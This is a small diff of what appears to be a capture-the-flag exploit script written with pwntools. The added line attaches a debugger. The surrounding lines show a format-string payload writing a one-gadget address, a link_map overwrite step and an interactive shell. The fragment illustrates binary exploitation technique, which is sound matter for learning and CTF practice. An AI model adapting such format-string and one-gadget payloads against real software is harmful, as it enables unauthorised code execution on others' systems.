@@ -27,6 +27,7 @@ r.send(b'%688c%40$nAAAAAA' + p64(one_shot)[:6])
 
 # overwrite link_map
 r.sendlineafter('global or local > ', 'global')
+gdb.attach(r)
 r.sendlineafter('read or write > ', 'write')
 
 r.interactive()
